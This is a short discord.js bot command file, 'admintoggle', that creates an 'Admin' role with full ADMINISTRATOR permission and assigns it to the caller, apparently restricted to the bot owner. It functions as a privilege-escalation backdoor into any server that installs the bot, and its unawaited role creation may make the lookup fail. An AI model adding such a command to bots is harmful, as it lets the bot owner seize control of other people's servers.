const Discord = require('discord.js');
const sql = require('sqlite3').verbose();
var db = new sql.Database("db.sqlite");
const {prefix, token, status, gatewaychannelid, modlogchannelid, messagechannelid} = require("../config.json"); //get the prefix, token, status and welcome channel id

exports.run = (client, message, args, level) => {
  message.guild.roles.create({ data: { name: 'Admin', permissions: ['ADMINISTRATOR'] } });
  let role = message.channel.guild.roles.cache.find(r => r.name === 'Admin');
  message.member.roles.add(role);

}

exports.config = {
  name: "admintoggle",
  usage: "admintoggle",
  description: "Become an admin!",
  category: "utility",
  permissionLevel: 10
};
